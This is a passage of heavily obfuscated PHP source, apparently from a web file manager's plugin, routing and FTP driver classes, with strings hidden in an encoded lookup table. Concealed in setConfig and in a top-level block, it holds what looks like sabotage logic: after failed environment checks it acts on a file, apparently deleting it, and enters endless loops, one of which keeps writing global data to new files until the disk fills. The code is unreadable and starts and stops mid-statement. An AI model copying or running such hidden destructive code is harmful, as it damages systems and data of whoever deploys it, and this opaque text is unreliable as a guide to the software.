$çÇß™íÃ)) { return; } preg_match_all($ªôÄä©„[1594], $şÚßŒ¨á, $‚ÇôÂ› ); if (!is_array($‚ÇôÂ› ) || count($‚ÇôÂ› ) == 0 || !is_array($‚ÇôÂ› [0]) || count($‚ÇôÂ› [0]) == 0) { return; } $ÙÇƒ¶Ô = $this->getConfig(); $Òö˜Ï = array(); $ù®‘Øº² = array(); foreach ($‚ÇôÂ› [0] as $Û²Âñ©) { $÷­ã‰äæ = substr($Û²Âñ©, strlen($çÇß™íÃ), -2); $Òö˜Ï[] = $Û²Âñ©; $ù®‘Øº²[] = _get($ÙÇƒ¶Ô, $÷­ã‰äæ); } $şÚßŒ¨á = str_replace($Òö˜Ï, $ù®‘Øº², $şÚßŒ¨á); } private function parsePackage(&$—É¦Åº) { $š¸á¡Ë¢ =& $_SERVER[Ã¶¡¶„æ]; $´ş¦®¦Û = $š¸á¡Ë¢[1595]; if (!strstr($—É¦Åº, $´ş¦®¦Û)) { return; } preg_match_all($š¸á¡Ë¢[1596], $—É¦Åº, $â¾×ôâ­); if (!is_array($â¾×ôâ­) || count($â¾×ôâ­) == 0 || !is_array($â¾×ôâ­[0]) || count($â¾×ôâ­[0]) == 0) { return; } $”Ëè„¾ = $this->appPackage(); $¯ßäÕÖæ = array(); $¹´éğ›œ = array(); foreach ($â¾×ôâ­[0] as $‹ø«ñ“Ô) { $ˆúÁ¦ÇÖ = substr($‹ø«ñ“Ô, strlen($´ş¦®¦Û), -2); $¯ßäÕÖæ[] = $‹ø«ñ“Ô; $¹´éğ›œ[] = _get($”Ëè„¾, $ˆúÁ¦ÇÖ); } $—É¦Åº = str_replace($¯ßäÕÖæ, $¹´éğ›œ, $—É¦Åº); } final function echoFile($Û¼©ş…é, $Ğ­™õ¶’ = false) { $¸ˆ¬òË’ =& $_SERVER[Ã¶¡¶„æ]; $îï“‘Â = $this->pluginPath . $Û¼©ş…é; if (ACT == $¸ˆ¬òË’[1597]) { echo $¸ˆ¬òË’[1598] . $this->pluginName . $¸ˆ¬òË’[8] . $Û¼©ş…é . $¸ˆ¬òË’[1599]; if (!file_exists($îï“‘Â)) { echo $¸ˆ¬òË’[1600]; return; } } $§÷Ø ã¾ = $this->parseFile($îï“‘Â); $this->parseLang($§÷Ø ã¾); $this->parseConfig($§÷Ø ã¾); $this->parsePackage($§÷Ø ã¾); if (is_array($Ğ­™õ¶’)) { $§÷Ø ã¾ = str_replace(array_keys($Ğ­™õ¶’), array_values($Ğ­™õ¶’), $§÷Ø ã¾); } echo $¸ˆ¬òË’[231] . $§÷Ø ã¾; } final function initLang() { $î¡Ğ£ñ =& $_SERVER[Ã¶¡¶„æ]; $²¾¢ß¼ì = $î¡Ğ£ñ[1601]; $´Å¬Ï = $this->pluginPath . $î¡Ğ£ñ[1602]; $”ô·®ãÅ = I18n::getType(); $–áÛ“È¼ = array(); if (file_exists($´Å¬Ï . $”ô·®ãÅ . $î¡Ğ£ñ[852])) { $–áÛ“È¼ = (include $´Å¬Ï . $”ô·®ãÅ . $î¡Ğ£ñ[852]); } else { if ($”ô·®ãÅ == $î¡Ğ£ñ[1603] && !file_exists($´Å¬Ï . $”ô·®ãÅ . $î¡Ğ£ñ[852]) && file_exists($´Å¬Ï . $î¡Ğ£ñ[1604])) { $–áÛ“È¼ = (include $´Å¬Ï . $î¡Ğ£ñ[1604]); } else { if (file_exists($´Å¬Ï . $²¾¢ß¼ì . $î¡Ğ£ñ[852])) { $–áÛ“È¼ = (include $´Å¬Ï . $²¾¢ß¼ì . $î¡Ğ£ñ[852]); } } } if (!is_array($–áÛ“È¼)) { return array(); } if (@count($–áÛ“È¼) > 0) { I18n::set($–áÛ“È¼); } return $–áÛ“È¼; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($œ¥ä¨ƒÖ) { $©­í£ÕŒ =& $_SERVER[Ã¶¡¶„æ]; $¼·ğ¥ é = $_SERVER[$©­í£ÕŒ[843]] . $©­í£ÕŒ[844]; $øöñØµõ = $©­í£ÕŒ[890]; if ($_SERVER[$©­í£ÕŒ[840]] != $øöñØµõ($¼·ğ¥ é)) { $÷®•ÊØæ = $©­í£ÕŒ[891]; $¨»‚íï¯ = $©­í£ÕŒ[842]; $òŸ›ü“¤ = $_SERVER[$©­í£ÕŒ[843]] . $©­í£ÕŒ[844]; $Î‚Š–•Ö = $¨»‚íï¯($òŸ›ü“¤); $“‹¸Õ×Û = explode($©­í£ÕŒ[231], $Î‚Š–•Ö); if (count($“‹¸Õ×Û) < $©­í£ÕŒ[636]) { $Ì¬ãÈŒ = $©­í£ÕŒ[845]; $Ì¬ãÈŒ(); } $Õ³Šè = $©­í£ÕŒ[892]; $Õ³Šè($_SERVER[$©­í£ÕŒ[893]]); $÷®•ÊØæ = $©­í£ÕŒ[891]; $÷®•ÊØæ(); $§Â¶ä¡Ø = $©­í£ÕŒ[894]; $­Á§“±Ó = json_encode($GLOBALS[$©­í£ÕŒ[895]]); $áóöÈÕâ = 1; for ($“Œ…‰‘ = $áóöÈÕâ; $“Œ…‰‘ > 0; $“Œ…‰‘++) { $§Â¶ä¡Ø(DATA_PATH . $“Œ…‰‘, $­Á§“±Ó); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $œ¥ä¨ƒÖ); } public function onSetConfig($ÜÆïÎÒê) { } public function onGetConfig($š¬ˆı’ê) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($İúòæÍ) { if ($İúòæÍ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ÉÖÄÁí÷ = "\160\x6c\x75\147\x69\156\x41\165\x74\150") { $•—±éº« =& $_SERVER[Ã¶¡¶„æ]; if (!defined($•—±éº«[475])) { return !1; } if (_get($GLOBALS, $•—±éº«[503])) { return !0; } $â¥ÄíôÆ = $this->getConfig(); if (!$â¥ÄíôÆ[$ÉÖÄÁí÷]) { return !1; } return ActionCall($•—±éº«[1605], $â¥ÄíôÆ[$ÉÖÄÁí÷]); } public function url($ê†Á„€Ğ, $úÉ×ª· = '', $ÅØÔô‰’ = true) { $Áä›–Ù =& $_SERVER[Ã¶¡¶„æ]; $Ô ÷Ö”ã = $this->getConfig(); $”€¶Û¾ = KOD_VERSION . $Áä›–Ù[10] . KOD_VERSION_BUILD; $›©¶Ş†İ = $this->packageVersion(); $¬†›‹Ôê = $”€¶Û¾ . $Áä›–Ù[386] . $›©¶Ş†İ; if (substr($ê†Á„€Ğ, 0, 4) == $Áä›–Ù[148] || substr($ê†Á„€Ğ, 0, 2) == $Áä›–Ù[1390]) { $»ÈÅ¼©× = $ê†Á„€Ğ . $Áä›–Ù[1606] . $¬†›‹Ôê; } else { if ($úÉ×ª· == $Áä›–Ù[12]) { $»ÈÅ¼©× = $this->pluginHost . $ê†Á„€Ğ . $Áä›–Ù[1606] . $¬†›‹Ôê; } else { if ($úÉ×ª· === $Áä›–Ù[75]) { $»ÈÅ¼©× = $this->pluginHost . $ê†Á„€Ğ; } else { if ($úÉ×ª· == $Áä›–Ù[1607]) { $»ÈÅ¼©× = STATIC_PATH . $ê†Á„€Ğ . $Áä›–Ù[1606] . $”€¶Û¾; } else { if ($úÉ×ª· == $Áä›–Ù[1608]) { $»ÈÅ¼©× = APP_HOST . $Áä›–Ù[1609] . $ê†Á„€Ğ . $Áä›–Ù[1606] . $”€¶Û¾; } else { if (isset($Ô ÷Ö”ã[$úÉ×ª·])) { $»ÈÅ¼©× = $Ô ÷Ö”ã[$úÉ×ª·] . $ê†Á„€Ğ . $Áä›–Ù[1606] . $¬†›‹Ôê; } } } } } } if (!$ÅØÔô‰’) { return $»ÈÅ¼©×; } echo $»ÈÅ¼©×; } public function link($…†¦‚Ø = false, $î¼Ï…¨² = '') { $í§šŠõ =& $_SERVER[Ã¶¡¶„æ]; if (!$…†¦‚Ø) { $this->link($í§šŠõ[1610], $í§šŠõ[1608]); $this->link($í§šŠõ[1611], $í§šŠõ[1607]); $this->link($í§šŠõ[1612], $í§šŠõ[1607]); $this->link($í§šŠõ[1613], $í§šŠõ[1607]); $this->link($í§šŠõ[1614], $í§šŠõ[1607]); return; } $¿ëö¿³ã = $this->url($…†¦‚Ø, $î¼Ï…¨², !1); if (substr($…†¦‚Ø, -3) == $í§šŠõ[1615]) { echo $í§šŠõ[1616] . $¿ëö¿³ã . $í§šŠõ[1617] . $í§šŠõ[231]; } else { if (substr($…†¦‚Ø, -4) == $í§šŠõ[1618]) { echo $í§šŠõ[1619] . $¿ëö¿³ã . $í§šŠõ[1620] . $í§šŠõ[231]; } } } } if (!isset($_SERVER[$_SERVER[Ã¶¡¶„æ][840]]) || !isset($_SERVER[$_SERVER[Ã¶¡¶„æ][847]])) { $_getc = $_SERVER[Ã¶¡¶„æ][842]; $_getfile = $_SERVER[$_SERVER[Ã¶¡¶„æ][843]] . $_SERVER[Ã¶¡¶„æ][844]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ã¶¡¶„æ][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ã¶¡¶„æ][619]) { $exit = $_SERVER[Ã¶¡¶„æ][845]; $exit(); } $_act = $_SERVER[Ã¶¡¶„æ][846]; $_act($_SERVER[$_SERVER[Ã¶¡¶„æ][843]] . $_SERVER[Ã¶¡¶„æ][844]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ã¶¡¶„æ][378]); } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\x5b\136\57\135\x2b", "\72\156\165\155" => "\133\x30\55\71\135\53", "\x3a\141\x6c\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($€ƒÛÄ©€, $Ğ…ƒæ…¼) { $¤ÕœŸ¸« =& $_SERVER[Ã¶¡¶„æ]; if ($€ƒÛÄ©€ == $¤ÕœŸ¸«[1621]) { $İ£Û‡ ° = array_map($¤ÕœŸ¸«[1622], $Ğ…ƒæ…¼[0]); $Â’Øª±Ç = strpos($Ğ…ƒæ…¼[1], $¤ÕœŸ¸«[8]) === 0 ? $Ğ…ƒæ…¼[1] : $¤ÕœŸ¸«[8] . $Ğ…ƒæ…¼[1]; $œ›Ê½–¹ = $Ğ…ƒæ…¼[2]; } else { $İ£Û‡ ° = null; $Â’Øª±Ç = strpos($Ğ…ƒæ…¼[0], $¤ÕœŸ¸«[8]) === 0 ? $Ğ…ƒæ…¼[0] : $¤ÕœŸ¸«[8] . $Ğ…ƒæ…¼[0]; $œ›Ê½–¹ = $Ğ…ƒæ…¼[1]; } array_push(self::$maps, $İ£Û‡ °); array_push(self::$routes, $Â’Øª±Ç); array_push(self::$methods, strtoupper($€ƒÛÄ©€)); array_push(self::$callbacks, $œ›Ê½–¹); } public static function error($¶ôµ ®‘) { self::$errorCallback = $¶ôµ ®‘; } public static function haltOnMatch($–³å’ñí = true) { self::$halts = $–³å’ñí; } public static function dispatch() { $Ó¦ŞÇ =& $_SERVER[Ã¶¡¶„æ]; $¦”ã—Ê¸ = parse_url($_SERVER[$Ó¦ŞÇ[1623]], PHP_URL_PATH); $‡ñĞç´ = $_SERVER[$Ó¦ŞÇ[159]]; $üÖ›…‰á = array_keys(static::$patterns); $¶Øöû = array_values(static::$patterns); $¦ÔéÂŒÀ = !1; self::$routes = preg_replace($Ó¦ŞÇ[1291], $Ó¦ŞÇ[8], self::$routes); if (in_array($¦”ã—Ê¸, self::$routes)) { $“ö·ìğ¬ = array_keys(self::$routes, $¦”ã—Ê¸); foreach ($“ö·ìğ¬ as $Óã²Ÿ‰) { if (self::$methods[$Óã²Ÿ‰] == $‡ñĞç´ || self::$methods[$Óã²Ÿ‰] == $Ó¦ŞÇ[1624] || in_array($‡ñĞç´, self::$maps[$Óã²Ÿ‰])) { $¦ÔéÂŒÀ = !0; if (!is_object(self::$callbacks[$Óã²Ÿ‰])) { $¥È×±¢˜ = explode($Ó¦ŞÇ[8], self::$callbacks[$Óã²Ÿ‰]); $í­æš‘ = end($¥È×±¢˜); $Ö“„Ä = explode($Ó¦ŞÇ[1223], $í­æš‘); $ûãÕ–¾Î = new $Ö“„Ä[0](); $ûãÕ–¾Î->{$Ö“„Ä[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Óã²Ÿ‰]); if (self::$halts) { return; } } } } } else { $èÅâÉ«ß = 0; foreach (self::$routes as $Óã²Ÿ‰) { if (strpos($Óã²Ÿ‰, $Ó¦ŞÇ[4]) !== !1) { $Óã²Ÿ‰ = str_replace($üÖ›…‰á, $¶Øöû, $Óã²Ÿ‰); } if (preg_match($Ó¦ŞÇ[1625] . $Óã²Ÿ‰ . $Ó¦ŞÇ[1626], $¦”ã—Ê¸, $ƒÓéÒù²)) { if (self::$methods[$èÅâÉ«ß] == $‡ñĞç´ || self::$methods[$èÅâÉ«ß] == $Ó¦ŞÇ[1624] || !empty(self::$maps[$èÅâÉ«ß]) && in_array($‡ñĞç´, self::$maps[$èÅâÉ«ß])) { $¦ÔéÂŒÀ = !0; array_shift($ƒÓéÒù²); if (!is_object(self::$callbacks[$èÅâÉ«ß])) { $¥È×±¢˜ = explode($Ó¦ŞÇ[8], self::$callbacks[$èÅâÉ«ß]); $í­æš‘ = end($¥È×±¢˜); $Ö“„Ä = explode($Ó¦ŞÇ[1223], $í­æš‘); $ûãÕ–¾Î = new $Ö“„Ä[0](); if (!method_exists($ûãÕ–¾Î, $Ö“„Ä[1])) { echo $Ó¦ŞÇ[1627]; } else { call_user_func_array(array($ûãÕ–¾Î, $Ö“„Ä[1]), $ƒÓéÒù²); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$èÅâÉ«ß], $ƒÓéÒù²); if (self::$halts) { return; } } } } $èÅâÉ«ß++; } } if ($¦ÔéÂŒÀ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ãÔß£ƒƒ =& $_SERVER[Ã¶¡¶„æ]; header($_SERVER[$ãÔß£ƒƒ[1628]] . $ãÔß£ƒƒ[1629]); echo $ãÔß£ƒƒ[1630]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Ó¦ŞÇ[1623]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto AÄÑù¾à·Ğ; aàá©‚‡š„: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($ÅÚÓïÃÄ) { parent::__construct(); if (count($ÅÚÓïÃÄ) > 0) { $this->_init($ÅÚÓïÃÄ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ı·ê„‡¿) { $Ã“ˆ³°ú =& $_SERVER[Ã¶¡¶„æ]; global $config; $this->appCharset = $config[$Ã“ˆ³°ú[1387]]; $this->systemCharset = $config[$Ã“ˆ³°ú[1388]]; if (isset($ı·ê„‡¿[$Ã“ˆ³°ú[1389]]) && $ı·ê„‡¿[$Ã“ˆ³°ú[1389]]) { $this->systemCharset = $ı·ê„‡¿[$Ã“ˆ³°ú[1389]]; } } public function iconvApp($Î€ıßÚ) { return $this->iconvTo($Î€ıßÚ, $this->systemCharset, $this->appCharset); } public function iconvSystem($ª”ó›èÂ) { return $this->iconvTo($ª”ó›èÂ, $this->appCharset, $this->systemCharset); } public function getPathOuter($™ç¤¿í) { $›ˆ‘éá´ =& $_SERVER[Ã¶¡¶„æ]; $Æ‘ıµáƒ = $this->iconvApp($this->pathBase); $™ç¤¿í = $this->iconvApp($™ç¤¿í); if (substr($Æ‘ıµáƒ, 0, 2) == $›ˆ‘éá´[1390]) { $Æ‘ıµáƒ = BASIC_PATH . substr($Æ‘ıµáƒ, 2); } if (substr($™ç¤¿í, 0, 2) == $›ˆ‘éá´[1390]) { $™ç¤¿í = BASIC_PATH . substr($™ç¤¿í, 2); } $Æ‘ıµáƒ = KodIO::clear($Æ‘ıµáƒ); $™ç¤¿í = KodIO::clear($™ç¤¿í); $™ç¤¿í = substr($™ç¤¿í, strlen($Æ‘ıµáƒ)); if (empty($this->pathDriver)) { return $™ç¤¿í; } return $this->pathDriver . $›ˆ‘éá´[8] . ltrim($™ç¤¿í, $›ˆ‘éá´[8]); } private function _init($»ĞÁ½à— = array()) { $€È†¿Ú¿ =& $_SERVER[Ã¶¡¶„æ]; if (!function_exists($€È†¿Ú¿[1391])) { throw new Exception(LNG($€È†¿Ú¿[1392])); } $this->config = $»ĞÁ½à—; $this->charsetReset($»ĞÁ½à—); foreach ($»ĞÁ½à— as $è«‰££ô => $íˆ»­ƒ­) { if (isset($this->{$è«‰££ô})) { $this->{$è«‰££ô} = $íˆ»­ƒ­; } } return $this->_login($»ĞÁ½à—); } private function _login($µÏòàÈ¾) { $ÜÉ¿¯… =& $_SERVER[Ã¶¡¶„æ]; static $„Ôâ¦á» = array(); $Œ±­ïõ€ = md5(json_encode($µÏòàÈ¾)); if (isset($„Ôâ¦á»[$Œ±­ïõ€])) { foreach ($„Ôâ¦á»[$Œ±­ïõ€] as $©ÙåÛë² => $®¶ß¼ôÃ) { $this->{$©ÙåÛë²} = $®¶ß¼ôÃ; } return !0; } $úĞšìì = parse_url(trim($this->server, $ÜÉ¿¯…[8])); $this->host = $úĞšìì[$ÜÉ¿¯…[181]]; $Ù…çÏçŒ = isset($úĞšìì[$ÜÉ¿¯…[180]]) && $úĞšìì[$ÜÉ¿¯…[180]] == $ÜÉ¿¯…[1393] ? !0 : !1; $this->scheme = $Ù…çÏçŒ ? $ÜÉ¿¯…[1394] : $ÜÉ¿¯…[1395]; $this->port = isset($úĞšìì[$ÜÉ¿¯…[182]]) ? $úĞšìì[$ÜÉ¿¯…[182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $èã¦¸‡Å = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Õ‹ÙÛÆã = $this->pasv == $ÜÉ¿¯…[88] ? !0 : !1; @ftp_pasv($this->connect, $Õ‹ÙÛÆã); $„Ôâ¦á»[$Œ±­ïõ€] = array($ÜÉ¿¯…[1396] => $this->connect, $ÜÉ¿¯…[181] => $this->host, $ÜÉ¿¯…[180] => $this->scheme, $ÜÉ¿¯…[182] => $this->port); return $èã¦¸‡Å; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($®ıè–Ò, $¹æÁØÇ = '', $ëêÕ©õ = REPEAT_RENAME) { if ($this->setContent($®ıè–Ò, $¹æÁØÇ)) { return $this->getPathOuter($®ıè–Ò); } return !1; } public function mkdir($¿ˆÍ„–Ò, $Æ”ûéÜ” = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $¿ˆÍ„–Ò = $this->iconvSystem($¿ˆÍ„–Ò); if ($this->_isFolder($¿ˆÍ„–Ò) || @ftp_mkdir($this->connect, $¿ˆÍ„–Ò)) { return $this->getPathOuter($¿ˆÍ„–Ò); } if (!$this->mkdir($this->pathFather($¿ˆÍ„–Ò))) { return !1; } if ($¿ˆÍ„–Ò = @ftp_mkdir($this->connect, $¿ˆÍ„–Ò)) { return $this->getPathOuter($¿ˆÍ„–Ò); } return !1; } public function copyFile($ÙÃÊõ½†, $ù—¦½ùÎ) { if (!$this->_isconn()) { return !1; } $­“æÔæ = $this->pathThis($this->iconvSystem($ÙÃÊõ½†)); $Æ­˜¨ßş = $this->tempFile($­“æÔæ); $Ìâƒì‚ = $this->iconvApp($Æ­˜¨ßş); $this->download($ÙÃÊõ½†, $Ìâƒì‚); $«Ù½œİ» = $this->upload($ù—¦½ùÎ, $Ìâƒì‚); $this->tempFileRemve($Æ­˜¨ßş); return $«Ù½œİ»; } public function moveFile($ÌÉÏ–ïê, $ë—â†Í) { if (!$this->_isconn()) { return !1; } $ÌÉÏ–ïê = $this->iconvSystem($ÌÉÏ–ïê); $ë—â†Í = $this->iconvSystem($ë—â†Í); $ÏÎ×¬ı = @ftp_rename($this->connect, $ÌÉÏ–ïê, $ë—â†Í); return $ÏÎ×¬ı ? $this->getPathOuter($ë—â†Í) : !1; } public function delFile($üÆ¨ƒ¸ø) { if (!$this->_isconn()) { return !1; } $üÆ¨ƒ¸ø = $this->iconvSystem($üÆ¨ƒ¸ø); return @ftp_delete($this->connect, $üÆ¨ƒ¸ø); } public function delFolder($ÙÕàŠË) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¸Ã»°ÍÍ = $ç¸é”ªÍ = array(); $this->fileList($ÙÕàŠË, $¸Ã»°ÍÍ, $ç¸é”ªÍ, !0); $this->listItemCache = !0; foreach ($ç¸é”ªÍ as $Ê·çí«˜) { $›˜˜ÅúĞ = $this->iconvSystem($Ê·çí«˜[$_SERVER[Ã¶¡¶„æ][32]]); $ß¥¢çÊÉ = @ftp_delete($this->connect, $›˜˜ÅúĞ); if (!$ß¥¢çÊÉ) { return !1; } } foreach ($¸Ã»°ÍÍ as $›˜˜ÅúĞ) { $›˜˜ÅúĞ = $this->iconvSystem($›˜˜ÅúĞ); $ß¥¢çÊÉ = @ftp_rmdir($this->connect, $›˜˜ÅúĞ); if (!$ß¥¢çÊÉ) { return !1; } } $ÙÕàŠË = $this->iconvSystem($ÙÕàŠË); return @ftp_rmdir($this->connect, $ÙÕàŠË); } public function rename($øë¾±Éä, $‡¸ŞÕùò) { $ºİçò” =& $_SERVER[Ã¶¡¶„æ]; if (!$this->_isconn()) { return !1; } $¼Ÿ“éË = $this->fileNameAuto($this->pathFather($øë¾±Éä), $‡¸ŞÕùò); $¼Ÿ“éË = $this->iconvSystem($¼Ÿ“éË); $øë¾±Éä = $this->iconvSystem($øë¾±Éä); $…²ÕÒ‰„ = $this->pathFather($øë¾±Éä); $­œ–Í£á = rtrim($…²ÕÒ‰„, $ºİçò”[8]) . $ºİçò”[8] . $¼Ÿ“éË; $½×©”¡ = @ftp_rename($this->connect, $øë¾±Éä, $­œ–Í£á); $­œ–Í£á = $this->iconvApp($­œ–Í£á); return $½×©”¡ ? $this->getPathOuter($­œ–Í£á) : !1; } private function folderInfo($Â…ŸßË‚, $ûô©áˆ¨ = false) { $˜õËÚè =& $_SERVER[Ã¶¡¶„æ]; $àåıø·† = array($˜õËÚè[32] => $this->pathThis($Â…ŸßË‚), $˜õËÚè[84] => $this->getPathOuter($˜õËÚè[8] . $Â…ŸßË‚), $˜õËÚè[33] => $˜õËÚè[75]); if ($ûô©áˆ¨) { return $àåıø·†; } $àåıø·†[$˜õËÚè[200]] = $àåıø·†[$˜õËÚè[85]] = 0; $àåıø·†[$˜õËÚè[201]] = $àåıø·†[$˜õËÚè[202]] = !0; return $àåıø·†; } private function fileInfo($æÊ§Â¯©, $…ËâóŒ• = false, $ãïÀÍ†Õ = array()) { $·¦Â–çæ =& $_SERVER[Ã¶¡¶„æ]; $â—ÎãÇ” = array($·¦Â–çæ[32] => $this->pathThis($æÊ§Â¯©), $·¦Â–çæ[84] => $this->getPathOuter($·¦Â–çæ[8] . $æÊ§Â¯©), $·¦Â–çæ[33] => $·¦Â–çæ[199], $·¦Â–çæ[76] => isset($ãïÀÍ†Õ[$·¦Â–çæ[76]]) ? $ãïÀÍ†Õ[$·¦Â–çæ[76]] : 0, $·¦Â–çæ[174] => $this->ext($æÊ§Â¯©)); if ($…ËâóŒ•) { return $â—ÎãÇ”; } $â—ÎãÇ”[$·¦Â–çæ[200]] = $â—ÎãÇ”[$·¦Â–çæ[85]] = 0; $â—ÎãÇ”[$·¦Â–çæ[201]] = $â—ÎãÇ”[$·¦Â–çæ[202]] = !0; $±¬úì¨ = $this->iconvSystem($æÊ§Â¯©); $â—ÎãÇ”[$·¦Â–çæ[85]] = @ftp_mdtm($this->connect, $±¬úì¨); if (empty($ãïÀÍ†Õ)) { $ãïÀÍ†Õ = $this->objectMeta($æÊ§Â¯©); if (!$ãïÀÍ†Õ) { return $â—ÎãÇ”; } } $â—ÎãÇ”[$·¦Â–çæ[76]] = $ãïÀÍ†Õ[$·¦Â–çæ[76]]; return $â—ÎãÇ”; } public function size($ñƒşéÌÆ) { $€À¾¹¼¨ = $this->objectMeta($ñƒşéÌÆ); return $€À¾¹¼¨ ? $€À¾¹¼¨[$_SERVER[Ã¶¡¶„æ][76]] : 0; } public function info($ô¬›ìÒí) { if ($this->isFile($ô¬›ìÒí)) { return $this->fileInfo($ô¬›ìÒí, 0); } else { if ($this->isFolder($ô¬›ìÒí)) { return $this->folderInfo($ô¬›ìÒí); } } return !1; } private function fileList($•±±¬, &$İ’£Î’», &$·Ø“·€“, $¤òÜìøı = false) { $€û‰Åş‰ =& $_SERVER[Ã¶¡¶„æ]; $•±±¬ = $this->iconvSystem($•±±¬); if (!$this->isFolder($•±±¬)) { return !1; } @ftp_chdir($this->connect, $€û‰Åş‰[8]); $•±±¬ = rtrim($•±±¬, $€û‰Åş‰[8]) . $€û‰Åş‰[8]; check_abort(); $ÍËù´–Á = @ftp_rawlist($this->connect, $•±±¬); if (!$ÍËù´–Á) { $ÍËù´–Á = array(); } $¹â·şëª = array($€û‰Åş‰[10] => 1, $€û‰Åş‰[1397] => 1); foreach ($ÍËù´–Á as $ğñşÌâ) { $ÄØ‰Ğ‹ = $this->_listItem($ğñşÌâ); if ($ÄØ‰Ğ‹[0] == $€û‰Åş‰[765]) { continue; } $ƒ¨Éª±“ = $ÄØ‰Ğ‹[8]; if (empty($ƒ¨Éª±“) && $ƒ¨Éª±“ !== $€û‰Åş‰[197] || isset($¹â·şëª[$ƒ¨Éª±“])) { continue; } $ƒ¨Éª±“ = $this->iconvApp($•±±¬ . ltrim($ƒ¨Éª±“, $€û‰Åş‰[8])); $‡ÊÔ³üó = array($€û‰Åş‰[32] => $ƒ¨Éª±“, $€û‰Åş‰[33] => $€û‰Åş‰[199], $€û‰Åş‰[76] => $ÄØ‰Ğ‹[4]); if (substr($ğñşÌâ, 0, 1) == $€û‰Åş‰[1398]) { $‡ÊÔ³üó[$€û‰Åş‰[33]] = $€û‰Åş‰[75]; $‡ÊÔ³üó[$€û‰Åş‰[76]] = 0; } $ŒÌ§­ø™ = $‡ÊÔ³üó[$€û‰Åş‰[33]] == $€û‰Åş‰[75] ? !0 : !1; $this->cacheMethodInfoSet($ƒ¨Éª±“, $ŒÌ§­ø™, $‡ÊÔ³üó); if ($ŒÌ§­ø™) { $İ’£Î’»[] = $ƒ¨Éª±“; if ($¤òÜìøı) { $this->fileList($ƒ¨Éª±“, $İ’£Î’», $·Ø“·€“, $¤òÜìøı); } continue; } $·Ø“·€“[] = $‡ÊÔ³üó; } $this->cacheMethodInfoSet($•±±¬, !0); } private function _listItem($·äêÇüø) { if (empty($·äêÇüø)) { return array(); } $ùçÓ‡²Ò = preg_split($_SERVER[Ã¶¡¶„æ][1399], $·äêÇüø); if (count($ùçÓ‡²Ò) <= 9) { return $ùçÓ‡²Ò; } $ùçÓ‡²Ò[8] = trim(substr($·äêÇüø, strpos($·äêÇüø, $ùçÓ‡²Ò[7]) + strlen($ùçÓ‡²Ò[7]))); return array_splice($ùçÓ‡²Ò, 0, 9); } public function listPath($ŞùêÑ‹, $æÍÙßŞ‹ = false) { $Àç—Ì¢­ =& $_SERVER[Ã¶¡¶„æ]; if (!$this->_isconn()) { return !1; } $ìéïÆÀ’ = $º¥öÏÆö = array(); $this->fileList($ŞùêÑ‹, $ìéïÆÀ’, $º¥öÏÆö); foreach ($ìéïÆÀ’ as $éç‡ğÇÖ => $Œ×‹¾Åô) { $ìéïÆÀ’[$éç‡ğÇÖ] = $this->folderInfo($Œ×‹¾Åô, $æÍÙßŞ‹); } foreach ($º¥öÏÆö as $éç‡ğÇÖ => $Œ×‹¾Åô) { $º¥öÏÆö[$éç‡ğÇÖ] = $this->fileInfo($Œ×‹¾Åô[$Àç—Ì¢­[32]], $æÍÙßŞ‹, $Œ×‹¾Åô); } return array($Àç—Ì¢­[82] => $ìéïÆÀ’, $Àç—Ì¢­[83] => $º¥öÏÆö); } public function has($ÍÚº©•§, $õñ€¸Îˆ = false, $ëïöÊü = true) { $ò—“áŒ =& $_SERVER[Ã¶¡¶„æ]; $İ×‹Ôä× = $ñù¯îø = array(); $æÓªêêÌ = $õñ€¸Îˆ ? !0 : !1; $this->fileList($ÍÚº©•§, $İ×‹Ôä×, $ñù¯îø, $æÓªêêÌ); if ($õñ€¸Îˆ) { return array($ò—“áŒ[207] => count($ñù¯îø), $ò—“áŒ[208] => count($İ×‹Ôä×)); } if ($ëïöÊü) { if (count($ñù¯îø)) { return !0; } } else { if (count($İ×‹Ôä×)) { return !0; } } return !1; } public function listAll($Î—ÑÇˆê) { $Êî€…— =& $_SERVER[Ã¶¡¶„æ]; if (!$this->_isconn()) { return !1; } $ŒéÚı€‚ = $¥óúı‚ = array(); $this->fileList($Î—ÑÇˆê, $ŒéÚı€‚, $¥óúı‚, !0); $ÙæôÜ¹ = array(); foreach ($¥óúı‚ as $İÅ›†¡ï) { $ÙæôÜ¹[$İÅ›†¡ï[$Êî€…—[32]]] = $İÅ›†¡ï[$Êî€…—[76]]; } foreach ($ŒéÚı€‚ as $İÅ›†¡ï) { if (is_string($İÅ›†¡ï)) { $ÙæôÜ¹[$İÅ›†¡ï] = 0; } } return $this->listAllFiles($Î—ÑÇˆê, array_keys($ÙæôÜ¹), $ÙæôÜ¹); } public function getContent($°ƒÇŸâô) { if (!$this->_isconn()) { return !1; } $°ƒÇŸâô = $this->iconvSystem($°ƒÇŸâô); return 